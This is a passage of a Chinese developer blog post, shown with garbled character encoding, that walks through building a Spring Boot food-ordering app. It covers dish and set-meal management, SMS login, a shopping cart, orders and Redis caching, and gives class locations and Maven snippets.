/>é€»è¾‘<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/31c8e202fea94bcf8a775644996a6cc5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ³¨æ„ï¼Œè¿™é‡Œå›æ˜¾æ•°æ®æ˜¯è¦ç”¨DishDtoï¼Œå› ä¸ºå‰ç«¯è¦æ˜¾ç¤ºå£å‘³ç­‰ä¿¡æ¯ï¼Œè¿™é‡Œå¦‚æœç”¨Dishæ˜¯æ— æ³•å®Œç¾æ˜¾ç¤ºçš„ï¼Œæ‰€ä»¥è¦ç”¨DishDto</p><h3 id="å›æ˜¾å¡«å……æŸ¥è¯¢"><a class="markdownIt-Anchor" href="#å›æ˜¾å¡«å……æŸ¥è¯¢"></a> å›æ˜¾å¡«å……æŸ¥è¯¢</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7fd4eb56b06542b490e056bc8989a12c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿™æ˜¯ä¸ªå¤šè¡¨è”æŸ¥ï¼Œç”¨MPè‚¯å®šä¸è¡Œï¼Œå¾—è‡ªå·±å†™<br />Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (updateDish)</code><br />Serviceä½ç½®ï¼š<code>com.xyy.service.DishService</code><br />ServiceImplä½ç½®ï¼š<code>com.xyy.service.impl.DishServiceImpl</code></p><h3 id="æ›´æ–°å®ç°"><a class="markdownIt-Anchor" href="#æ›´æ–°å®ç°"></a> æ›´æ–°å®ç°</h3><p>å®é™…ä¸Šå°±æ˜¯ä¸¤ä¸ªè¡¨è”åŠ¨æ›´æ–°å’Œåˆ é™¤æ“ä½œï¼Œæ‰€ä»¥MPç›´æ¥æ“ä½œæ˜¯ä¸å¯ä»¥çš„ï¼Œæ‰€ä»¥è¦åœ¨Serviceå±‚è‡ªå·±å†å°è£…ä¸€ä¸ªåˆ é™¤æ–¹æ³•ï¼Œç»™Controllerå±‚è°ƒç”¨åˆ é™¤å°±è¡Œ<br />å¯¹äºDishå¯¹è±¡å¯ä»¥ç›´æ¥è¿›è¡Œæ›´æ–°ï¼Œå› ä¸ºDishDtoæ˜¯Dishçš„å­ç±»<br />å› æ­¤å¯ä»¥è°ƒç”¨DishServiceçš„updateæ–¹æ³•ä¼ å…¥DishDtoå¯¹è±¡ï¼Œæ¥å®ç°Dishçš„æ›´æ–°<br />Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (updateDish)</code><br />ç¡®å®å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ï¼Œå› ä¸ºè¯·æ±‚æ–¹å¼ä¸ä¸€æ ·<br />Serviceä½ç½®ï¼š<code>com.xyy.service.DishService</code><br />ServiceImplä½ç½®ï¼š<code>com.xyy.service.impl.DishServiceImpl (updateDishWithFlavor)</code></p><h3 id="å…¶ä»–åŠŸèƒ½"><a class="markdownIt-Anchor" href="#å…¶ä»–åŠŸèƒ½"></a> å…¶ä»–åŠŸèƒ½</h3><p>å®Œæˆä¸€äº›å°åŠŸèƒ½çš„å¼€å‘<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b4b59c021748427c87fa6edc48619920.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h4 id="åœå”®åŠŸèƒ½"><a class="markdownIt-Anchor" href="#åœå”®åŠŸèƒ½"></a> åœå”®åŠŸèƒ½</h4><p>å°±æ˜¯æŠŠæ•°æ®åº“çš„statuså€¼æ›´æ–°ä¸€ä¸‹ï¼Œä¸¤ä¸ªè·¯å¾„ï¼Œä¸€ä¸ªå¯å”®ï¼Œä¸€ä¸ªåœå”®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f1da740301ed403399148b6d9afb31f5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åœå”®è¯·æ±‚è·¯å¾„<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2969987e765b4a8e8b4fd71b772bcfa0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¦‚æœçŠ¶æ€ä¸ä¸€æ ·äº†ï¼Œä¼šä»åœå”®å˜æˆå¯å”®ï¼ŒåŒæ—¶å¯¹åº”çš„è¯·æ±‚è·¯å¾„ä¹Ÿä¸ä¸€æ ·<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/335331ee558541e089128ff2b36faa6e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f3b5006617a144c2a50cf48e91daf7db.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (updateStatusStop)</code>åœæ­¢<br />Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (updateStatusStart)</code>å¯åŠ¨</p><h4 id="åˆ é™¤åŠŸèƒ½"><a class="markdownIt-Anchor" href="#åˆ é™¤åŠŸèƒ½"></a> åˆ é™¤åŠŸèƒ½</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2e291e2e9a5941dbafb90caed4c894a2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />èœå“åˆ é™¤åŠŸèƒ½<br />å®Œæˆé€»è¾‘åˆ é™¤ï¼Œä¸æ˜¯çœŸåˆ <br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2b84f5bc3cd54e1997a87f5768f0b48a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä½ç½®ï¼š<br />Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (deleteDish)</code>åœæ­¢</p><h1 id="å¥—é¤é¡µé¢"><a class="markdownIt-Anchor" href="#å¥—é¤é¡µé¢"></a> å¥—é¤é¡µé¢</h1><p>å®é™…ä¸Šå°±æ˜¯ä¸€ç»„èœå“çš„é›†åˆ</p><h2 id="æ–°å¢å¥—é¤æ¦‚è¿°"><a class="markdownIt-Anchor" href="#æ–°å¢å¥—é¤æ¦‚è¿°"></a> æ–°å¢å¥—é¤æ¦‚è¿°</h2><p>æ¶‰åŠåˆ°çš„æ•°æ®åº“<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/490ee26fc870424092c6f06b3b637de2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6ab0bc680c2d40d48da71becdf139330.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/458f7e16da474362ad0f5b49656bdc06.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¼å…¥SetmealDto<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9f5bd7dfcecc4c5a95d3ce1a48358980.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0bb88c91dfba4c759e8cca3eb574682e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="æ–°å¢å¥—é¤ä¹‹èœå“åˆ—è¡¨"><a class="markdownIt-Anchor" href="#æ–°å¢å¥—é¤ä¹‹èœå“åˆ—è¡¨"></a> æ–°å¢å¥—é¤ä¹‹èœå“åˆ—è¡¨</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7b242922f194454cbce663c939c19fe8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fd6a01bbfbee43a1b7ff6b420815ef7f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />Controllerä½ç½®ï¼š<code>com.xyy.controller.DishController (listCategory)</code></p><h2 id="æ–°å¢å¥—é¤å®ç°"><a class="markdownIt-Anchor" href="#æ–°å¢å¥—é¤å®ç°"></a> æ–°å¢å¥—é¤å®ç°</h2><p>å’Œæ–°å¢èœå“å·®ä¸å¤šï¼Œè¿™é‡Œä¹Ÿæ˜¯å¤šè¡¨çš„æ“ä½œ<br />Controllerä½ç½®ï¼š<code>com.xyy.controller.SetmealController (saveSetmeal)</code><br />Serviceä½ç½®ï¼š<code>com.xyy.service.SetmealService</code><br />ServiceImplä½ç½®ï¼š<code>com.xyy.service.impl.SetmealServiceImpl(saveWithDish)</code></p><h2 id="å¥—é¤åˆ†é¡µ"><a class="markdownIt-Anchor" href="#å¥—é¤åˆ†é¡µ"></a> å¥—é¤åˆ†é¡µ</h2><p>è¿™é‡Œçš„å¥—é¤åˆ†é¡µå’Œä»¥å¾€ä¸åŒï¼Œè®¾è®¡åˆ°äº†å¤šè¡¨å†…å®¹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/28b34889b2e4467c9e3e4a79aa3d2d18.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¥—é¤åˆ†é¡µControllerä½ç½®ï¼š<code>com.xyy.controller.SetmealController.pageList</code><br />å¥—é¤Mapperæ¥å£ä½ç½®ï¼š<code>com.xyy.mapper.SetmealMapper</code><br />Mapperæ–‡ä»¶ä½ç½®ï¼š<code>resource.mapper.SetmealMapper</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a02a17ef6b8648a59e2b90ef9ec70a3f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="æ›´æ–°å¥—é¤"><a class="markdownIt-Anchor" href="#æ›´æ–°å¥—é¤"></a> æ›´æ–°å¥—é¤</h2><p>æ·»åŠ å¥—é¤å’Œæ›´æ–°å¥—é¤æ˜¯å‡ ä¹å®Œå…¨ä¸€è‡´çš„ï¼Œå­—æ®µå·´æ‹‰å·´æ‹‰çš„éƒ½ä¸€æ ·<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5bf7c40f7b9147b7a093da18ae860952.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä½†æ˜¯æ³¨æ„ï¼Œä¿®æ”¹å¥—é¤çš„è¯ï¼Œéœ€è¦å…ˆå¯¹èœå“é¡µé¢è¿›è¡Œå¡«å……ï¼Œè¿™ä¸€é¡µéƒ½æ˜¯éœ€è¦å¡«å……æ»¡è¦ä¿®æ”¹çš„èœå“ä¿¡æ¯çš„ã€‚<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/07c01da9636d4643acea8689f2579f82.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å…ˆå‘è¯·æ±‚ï¼Œä¸€çœ‹å°±æ˜¯Restfulé£æ ¼è¯·æ±‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cb797ab490434dd2ad5de3e282e3f4c4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è·å–å¥—é¤Controllerä½ç½®ï¼š<code>com.xyy.controller.SetmealController.getSetmal</code></p><h2 id="æ›´æ–°é”€å”®çŠ¶æ€"><a class="markdownIt-Anchor" href="#æ›´æ–°é”€å”®çŠ¶æ€"></a> æ›´æ–°é”€å”®çŠ¶æ€</h2><p><img src="https://img-blog.csdnimg.cn/53db02cdb6fd4574b2471bdaf7825d78.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://img-blog.csdnimg.cn/f2158ec7d2924b2eb17e2ef7b92fc6f3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å’Œä¹‹å‰ä¸€ä¸ªä¸šåŠ¡é€»è¾‘å¾ˆåƒï¼Œä¸æƒ³å¤šèµ˜è¿°äº†ï¼Œç›´æ¥æ”¾æ¥å£ä½ç½®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bb10511b3fd14b398095865065700680.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>Controllerä½ç½®ï¼š<code>com.xyy.controller.SetmealController (startSale/stopSale)</code></p><h2 id="åˆ é™¤å¥—é¤"><a class="markdownIt-Anchor" href="#åˆ é™¤å¥—é¤"></a> åˆ é™¤å¥—é¤</h2><p>å¯ä»¥å•ç‹¬åˆ ï¼Œä¹Ÿå¯ä»¥æ‰¹é‡åˆ ï¼Œæ¥å£æ˜¯ä¸‡é‡‘æ²¹ï¼Œéƒ½èƒ½æ¥ï¼Œä¸»è¦çœ‹ä¼ æ¥çš„æ•°æ®æ˜¯å‡ ä¸ª<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/734b880bdf304e70bb9376ecebcd3d15.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/730459957d464af3827df49084205353.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ¥å£<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/678ea2f5eb194625a05567061bba5ad0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />== å¤šè¡¨åˆ é™¤ï¼Œåœ¨Controllerç›´æ¥å®ç°ä¸å¤ªç°å®ï¼Œæ‰€ä»¥è¦åœ¨ServiceæŠŠä¸šåŠ¡å†™å¥½==<br />Controllerä½ç½®ï¼š<code>com.xyy.controller.SetmealController (deleteSetmeal)</code><br />Serviceä½ç½®ï¼š<code>com.xyy.service.SetmealService</code><br />ServiceImplä½ç½®ï¼š<code>com.xyy.service.impl.SetmealServiceImpl(removeWithDish)</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bb4351bafe314861b6c775620f39641e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="å‰å°å¼€å‘æ‰‹æœºç«¯"><a class="markdownIt-Anchor" href="#å‰å°å¼€å‘æ‰‹æœºç«¯"></a> å‰å°å¼€å‘ï¼ˆæ‰‹æœºç«¯ï¼‰</h1><h1 id="è´¦æˆ·ç™»é™†"><a class="markdownIt-Anchor" href="#è´¦æˆ·ç™»é™†"></a> è´¦æˆ·ç™»é™†</h1><h2 id="çŸ­ä¿¡å‘é€"><a class="markdownIt-Anchor" href="#çŸ­ä¿¡å‘é€"></a> çŸ­ä¿¡å‘é€</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6db71e2024264927a59a3ae59bca5890.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/56cadd94e4de4536aec20ff921842039.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><a href="https://blog.csdn.net/qq_55106682/article/details/121920826">é˜¿é‡Œäº‘çŸ­ä¿¡ä¸šåŠ¡æ•™ç¨‹</a></p><h3 id="ä»£ç å®ç°"><a class="markdownIt-Anchor" href="#ä»£ç å®ç°"></a> ä»£ç å®ç°</h3><p><a href="https://help.aliyun.com/document_detail/112148.html">å®˜æ–¹æ–‡æ¡£åœ°å€</a><br />å¯¼å…¥Maven</p>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aliyun-java-sdk-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aliyun-java-sdk-dysmsapi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ca8d01eaf61a485a9e0edae0c0307c3a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¼å…¥çŸ­ä¿¡ç™»é™†çš„å·¥å…·ç±»ï¼ŒæŠŠACCESSKeyIDå’ŒSecretæ›´æ¢åˆ°ä½å°±è¡Œ<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fab29b651545452b8aaf515717a3244d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="éªŒè¯ç å‘é€"><a class="markdownIt-Anchor" href="#éªŒè¯ç å‘é€"></a> éªŒè¯ç å‘é€</h2><p>æ•°æ®æ¨¡å‹userè¡¨ï¼Œæ‰‹æœºéªŒè¯ç ä¸“ç”¨çš„è¡¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/582420e32f9449699765ad9db8f665bc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¼€å‘æµç¨‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/03e0ad86bbda4229b8985e6644e2e5f7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¿®æ”¹æ‹¦æˆªå™¨ï¼Œæ”¾è¡Œæ“ä½œ<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2c136ec0905248328f25be7e137b2da0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://img-blog.csdnimg.cn/15b21dad09be44bfa030984f5f4c1731.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />controllerä½ç½®ï¼š<code>com.xyy.controller.UserController ï¼ˆsendMsgï¼‰</code><br />å‘é€å®Œè¿˜éœ€è¦éªŒè¯ï¼ŒéªŒè¯å°±æ˜¯å¦ä¸€ä¸ªloginäº†</p><h2 id="ç”¨æˆ·ç™»é™†"><a class="markdownIt-Anchor" href="#ç”¨æˆ·ç™»é™†"></a> ç”¨æˆ·ç™»é™†</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/16f3f2b8f68948b0b4f2e01133adc6ce.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />controllerä½ç½®ï¼š<code>com.xyy.controller.UserController ï¼ˆloginï¼‰</code><br />è¿™é‡Œç™»é™†è¿˜æ¶‰åŠåˆ°è¿‡æ»¤å™¨æ”¾è¡Œçš„åŠŸèƒ½ï¼Œä¸è¦å¿˜è®°äº†ï¼ŒæŠŠç”¨æˆ·idå­˜å…¥sessionï¼Œè¿‡æ»¤å™¨ä¼šè¿›è¡ŒéªŒè¯<br />è¿‡æ»¤å™¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/16d1b1cf6fa54b408d9b5bcd495962f5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />controller<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7da50768c0b043f3a9a5f3dbce6915c1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="å‰å°é¡µé¢"><a class="markdownIt-Anchor" href="#å‰å°é¡µé¢"></a> å‰å°é¡µé¢</h1><h2 id="å¯¼å…¥ç”¨æˆ·åœ°å€ç°¿"><a class="markdownIt-Anchor" href="#å¯¼å…¥ç”¨æˆ·åœ°å€ç°¿"></a> å¯¼å…¥ç”¨æˆ·åœ°å€ç°¿</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/732d6d4d8bba4911b903055d7a2003cf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åœ°å€è¡¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e45d3cd4c91e4619a21a3342d4683508.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™é‡Œç›´æ¥å¯¼å…¥ç°æˆçš„AddressBookControllerï¼Œæ²¡æœ‰è‡ªå·±å†™</p><p>â€‹    com.xyy.controller.AddressBookController</p><h2 id="èœå“å±•ç¤º"><a class="markdownIt-Anchor" href="#èœå“å±•ç¤º"></a> èœå“å±•ç¤º</h2><p>é€»è¾‘æ¢³ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/db2983fb1a8a46bc85f4836dae41a24c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c7e3567ea3f94b718e33ba680e573121.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¿®æ”¹DishControllerçš„listæ–¹æ³•ï¼Œæ¥ç¬¦åˆå‰å°è¯·æ±‚çš„è¦æ±‚<br />controllerä½ç½®ï¼š<code>com.xyy.controller.DishController ï¼ˆlistCategoryï¼‰</code><br />å¥—é¤å†…èœå“Controllerï¼š<code>com.xyy.controller.SetmealController ï¼ˆlistï¼‰</code></p><h2 id="è´­ç‰©è½¦"><a class="markdownIt-Anchor" href="#è´­ç‰©è½¦"></a> è´­ç‰©è½¦</h2><p>æŠŠèœå“åŠ å…¥è´­ç‰©è½¦<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/159ef74addd64f60bfa9d9a44bf22d64.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3b7b1d5d90d949cb94c6c4f77a2f9d96.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />é€»è¾‘æ¢³ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/48b1358d65a8418689ada067bc6fbdd2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ³¨æ„ï¼Œè¿™é‡Œä¸éœ€è¦åç«¯å»ç®¡æ€»ä»·çš„è®¡ç®—ï¼Œå°±æ˜¯å•ä»·*æ•°é‡çš„è¿™ä¸ªæ“ä½œï¼Œä¸æ˜¯åç«¯çš„å†…å®¹ã€‚å‰ç«¯åœ¨å±•ç¤ºçš„æ—¶å€™è‡ªå·±å°±è®¡ç®—äº†ã€‚<br />ä½ç½®ï¼š<code>com.xyy.controller.ShoppingCartController ï¼ˆaddï¼‰</code></p><h2 id="ä¸‹å•"><a class="markdownIt-Anchor" href="#ä¸‹å•"></a> ä¸‹å•</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/37b2f6bb4b2e4d82942e38ceea4bbc78.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¹åº”çš„ä¸¤ä¸ªè¡¨ï¼Œä¸€ä¸ªæ˜¯ordersè¡¨ï¼Œå¦ä¸€ä¸ªæ˜¯orders_detailè¡¨</p><p>ordersè¡¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/37f1f4d9aec2474ab3578ad01062abf9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />orders_detailè¡¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d07d325b341841e787117d1f12d727e0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />äº¤äº’æµç¨‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/04bfdd8093cb41f7956332bb1561e12f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¸šåŠ¡æ¯”è¾ƒå¤æ‚ï¼Œåœ¨Serviceé‡Œå†™çš„<code>com.xyy.service.impl.OrdersServiceImpl</code></p><p>è‡³æ­¤åŸºç¡€éƒ¨åˆ†å®Œæˆï¼Œå¼€å§‹å¯¹é¡¹ç›®æ€§èƒ½è¿›è¡Œä¼˜åŒ–</p><h1 id="å°çŸ¥è¯†ç‚¹æ€»ç»“"><a class="markdownIt-Anchor" href="#å°çŸ¥è¯†ç‚¹æ€»ç»“"></a> å°çŸ¥è¯†ç‚¹æ€»ç»“</h1><h3 id="requestbodyçš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#requestbodyçš„ä½¿ç”¨"></a> @RequestBodyçš„ä½¿ç”¨</h3><p>åªæœ‰ä¼ æ¥çš„å‚æ•°æ˜¯Jsonæ‰èƒ½ç”¨RequestBodyæ¥æ”¶ï¼Œå¦‚æœä¸æ˜¯Jsonçš„æƒ…å†µï¼ˆæ¯”å¦‚é‚£ç§ï¼Ÿkey=value&amp;key=valueï¼‰æ˜¯ä¸å¯ä»¥ç”¨çš„ï¼Œä¼š400é”™è¯¯<br /><a href="https://blog.csdn.net/weixin_44062380/article/details/116103642">å…³äºRequestBodyä½•æ—¶ä½¿ç”¨</a></p><h1 id="ç¼“å­˜ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#ç¼“å­˜ä¼˜åŒ–"></a> ç¼“å­˜ä¼˜åŒ–</h1><p>åŸºäºRedisè¿›è¡Œç¼“å­˜ä¼˜åŒ–<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/017c0aab4eb345d68ba9a5a309e78c7a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="ç¯å¢ƒæ­å»º"><a class="markdownIt-Anchor" href="#ç¯å¢ƒæ­å»º"></a> ç¯å¢ƒæ­å»º</h2><h3 id="redisè¿›è¡Œé…ç½®"><a class="markdownIt-Anchor" href="#redisè¿›è¡Œé…ç½®"></a> Redisè¿›è¡Œé…ç½®</h3><p>åŠ å…¥Pomæ–‡ä»¶</p>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--å¯¼å…¥Redisä¾èµ–--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>ymlä¸­åŠ å…¥é…ç½®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a737f91d8934469ca405f2acf279272d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="çŸ­ä¿¡éªŒè¯ç -ç™»é™†ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#çŸ­ä¿¡éªŒè¯ç -ç™»é™†ä¼˜åŒ–"></a> çŸ­ä¿¡éªŒè¯ç ã€ç™»é™†ä¼˜åŒ–</h2><p>ç»™éªŒè¯ç åŠ å…¥æœ‰æ•ˆæ—¶é—´çš„éªŒè¯ï¼Œè®¾ç½®å¥½çŸ­ä¿¡éªŒè¯ç çš„æœ‰æ•ˆæ—¶é—´<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dd9f7fcb4dd948b380008dd1d769e535.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¦‚æœç™»é™†æˆåŠŸï¼Œå°±è‡ªåŠ¨åˆ 